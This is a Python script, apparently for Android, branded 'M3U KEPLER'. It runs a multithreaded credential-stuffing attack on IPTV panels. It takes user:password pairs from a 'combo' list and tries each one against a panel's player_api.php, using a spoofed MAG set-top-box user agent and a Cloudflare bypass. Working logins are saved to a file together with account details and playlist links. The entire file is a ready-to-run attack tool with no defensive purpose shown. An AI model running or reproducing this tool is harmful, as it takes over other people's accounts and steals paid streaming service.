import os
import pip
try:
    import requests
except:
    print("requests module error\n")
    pip.main(['install', 'requests'])
    import requests

import random
import time
import datetime
import subprocess
import json
import sys
import re
import base64
import pathlib
import threading
import shutil

global current_time
global hora_inicio
global hora_ini

global time_
time_ = time.localtime()
current_time = time.strftime("%d-%m-%y - %H:%M:%S", time_)
hora_ini = time.strftime("%H:%M:%S", time_)
requests.packages.urllib3.disable_warnings()

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

nick = "KEPLER"

try:
    import cfscrape
    sesq = requests.Session()
    ses = cfscrape.create_scraper(sess=sesq)
except:
    ses = requests.Session()

try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass

os.system('')

pattern = "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
print("\033[H\033[J", end="")
say = 0
hit = 0
bul = 0
cpm = 1
feyzo = (""" \n \33[32m               
 
   M3U KEPLER   
   By kepler   
   Esfuerzate                                 
\33[0;36m""")
print(feyzo)

say = 0
dsy = ""
dir = '/sdcard/combo/'
for files in os.listdir(dir):
    say = say + 1
    dsy = dsy + "    " + str(say) + "-) " + files + '\n'
print(""" elige tu Combo
    
 """ + dsy + """
 
\33[36m hay """ + str(say) + """ Combos
""")

dsyno = str(input(" \33[32m seleccione = \33[32m"))
say = 0
for files in os.listdir(dir):
    say = say + 1
    if dsyno == str(say):
        dosyaa = (dir + files)
        break
say = 0

print(feyzo)
print(dosyaa)
botsay = input("""
   \33[1;33m cuantos bots?\33[33m
    \33[1;33m entre 1 y 20.\33[33m
      
seleccione = """)
botsay = int(botsay)

HEADERd = {
    "Cookie": "stb_lang=en; timezone=America%2FToronto;",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
}

combo = dosyaa
dosya = ""
file = pathlib.Path(combo)
if file.exists():
    print("archivos encontrados")
else:
    print("\33[32mno encontrado.! \33[0m")
    dosya = "yok"
if dosya == "yok":
    exit()

c = open(combo, 'r')
totLen = c.readlines()
uz = (len(totLen))

print(feyzo)
print("Bot:" + str(botsay))

print("""
seleccione : """ + combo)
#################
panel = input("""
    \33[1;32msu servidor~puerto\33[32m\n\n
URL:\33[36m\33[36m\33[36m""")

panel = panel.replace("http://", "")
panel = panel.replace("/c", "")
panel = panel.replace("/", "")
portal = panel
fx = portal.replace(':', '_')
kanall = input("""
quiere categorias en la lista? 1 or 2
1= si
2= no
seleccione : """)
if not kanall == "1":
    kanall = 2

print(feyzo)

if int(time.time()) >= int(1893476328.0):
    print(int(1893476328.0))
    print(int(time.time()))
    quit()

def onay(veri, user, pas):
    status = veri.split('status":')[1]
    status = status.split(',')[0]
    status = status.replace('"', "")
    
    sound = "/sdcard/monedabros.mp3"
    file = pathlib.Path(sound)
    try:
        if file.exists():
            ad.mediaPlay(sound)
    except:
        pass

    acon = veri.split('active_cons":')[1]
    acon = acon.split(',')[0]
    acon = acon.replace('"', "")
    mcon = veri.split('max_connections":')[1]
    mcon = mcon.split(',')[0]
    mcon = mcon.replace('"', "")
    timezone = veri.split('timezone":"')[1]
    timezone = timezone.split('",')[0]
    timezone = timezone.replace("\/", "/")

    realm = veri.split('url":')[1]
    realm = realm.split(',')[0]
    realm = realm.replace('"', "")
    port = veri.split('port":')[1]
    port = port.split(',')[0]
    port = port.replace('"', "")
    user = veri.split('username":')[1]
    user = user.split(',')[0]
    user = user.replace('"', "")
    passw = veri.split('password":')[1]
    passw = passw.split(',')[0]
    passw = passw.replace('"', "")
    bitis = veri.split('exp_date":')[1]
    bitis = bitis.split(',')[0]
    bitis = bitis.replace('"', "")
    if bitis == "null":
        bitis = "Unlimited"
    else:
        bitis = (datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y %H:%M:%S'))
    bitis = bitis

    url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
    try:
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        kanalsayisi = str(veri.count("stream_id"))
        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        filmsayisi = str(veri.count("stream_id"))
        url5 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
        res = ses.get(url5, timeout=15, verify=False)
        veri = str(res.text)
        dizisayisi = str(veri.count("series_id"))
    except:
        kanalsayisi = filmsayisi = dizisayisi = "?"

    m3ulink = "http://" + panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"

    mt = ("""\n=============================================

   M3U KEPLER    
        
   By kepler
   Host~ http://""" + portal + """

   Real~ http://""" + realm + """

   User~ """ + user + """

   Pass~ """ + pas + """

   Exp.~ """ + bitis + """

   Connected~ """ + acon + """

   Max connections ~""" + mcon + """

   Status~ """ + status + """

   Country~ """ + timezone + """
 """)

    sayi = ("""
""" + str(nick) + """
   Channels > """ + kanalsayisi + """
   Movies > """ + filmsayisi + """
   Series > """ + dizisayisi + """

   user pass kepler """)
    
    mtl = ("""

   m3u Url >
""" + m3ulink + """

   M3U UPS  
""")
    yaz(mt + sayi + mtl + '\n')
    print(mt + sayi + mtl)

def yaz(kullanici):
    dosya = open('/sdcard/user-pass_kepler_' + fx + '.txt', 'a+')
    dosya.write(kullanici)
    dosya.close()

cpm = 0

def echox(user, pas, bot, fyz, oran, hit):
    global cpm
    cpmx = (time.time() - cpm)
    cpmx = (round(60 / cpmx))
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx
    time_ = time.localtime()
    timex = time.time()

    echo = ("""\n\033[32m
=============================================
   Server: """ + portal + """ \033[32m
   User pass: """ + user + """:""" + pas + """\033[32m
   Porcentaje  + \33[32m % """ + str(oran) + """\033[32m
   Bots: """ + str(botsay) + """\033[32m
   Total """ + str(fyz) + """ de """ + str(uz) + """\033[32m
=============================================

\n\33[33mCombo """ + str(dsyno) + str(dosyaa) + """ 

\n\33[36m   HIT   \33[0m \33[1;41m """ + str(hit) + """  \33[0m

=============================================
""")
    print(echo)

if int(time.time()) >= int(1893476328.0):
    quit()

hit = 0

def d1():
    global hit
    say = 0
    for fyz in range(1, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_01'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d2():
    global hit
    say = 0
    for fyz in range(2, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_02'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d3():
    global hit
    say = 0
    for fyz in range(3, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_03'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d4():
    global hit
    say = 0
    for fyz in range(4, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_04'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d5():
    global hit
    say = 0
    for fyz in range(5, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_05'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d6():
    global hit
    say = 0
    for fyz in range(6, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_06'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d7():
    global hit
    say = 0
    for fyz in range(7, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_07'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d8():
    global hit
    say = 0
    for fyz in range(8, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_08'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d9():
    global hit
    say = 0
    for fyz in range(9, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_09'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d10():
    global hit
    say = 0
    for fyz in range(10, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_10'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d11():
    global hit
    say = 0
    for fyz in range(11, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_11'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d12():
    global hit
    say = 0
    for fyz in range(12, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_12'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d13():
    global hit
    say = 0
    for fyz in range(13, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_13'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d14():
    global hit
    say = 0
    for fyz in range(14, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_14'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d15():
    global hit
    say = 0
    for fyz in range(15, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_15'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d16():
    global hit
    say = 0
    for fyz in range(16, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_16'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d17():
    global hit
    say = 0
    for fyz in range(17, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_17'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d18():
    global hit
    say = 0
    for fyz in range(18, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_18'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d19():
    global hit
    say = 0
    for fyz in range(19, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_19'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

def d20():
    global hit
    say = 0
    for fyz in range(20, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                user = 'error'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = 'error'
            say = int(say) + 1
            bot = 'Bot_20'
            oran = round(((fyz) / (uz) * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            veri = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    time.sleep(1)
            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('   HIT   ')
                    hit = hit + 1
                    onay(veri, user, pas)

t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t16 = threading.Thread(target=d16)
t17 = threading.Thread(target=d17)
t18 = threading.Thread(target=d18)
t19 = threading.Thread(target=d19)
t20 = threading.Thread(target=d20)

t1.start()

if botsay >= 2:
    t2.start()
if botsay >= 3:
    t3.start()
if botsay >= 4:
    t4.start()
if botsay >= 5:
    t5.start()
if botsay >= 6:
    t6.start()
if botsay >= 7:
    t7.start()
if botsay >= 8:
    t8.start()
if botsay >= 9:
    t9.start()
if botsay >= 10:
    t10.start()
if botsay >= 11:
    t11.start()
if botsay >= 12:
    t12.start()
if botsay >= 13:
    t13.start()
if botsay >= 14:
    t14.start()
if botsay >= 15:
    t15.start()
if botsay >= 16:
    t16.start()
if botsay >= 17:
    t17.start()
if botsay >= 18:
    t18.start()
if botsay >= 19:
    t19.start()
if botsay >= 20:
    t20.start()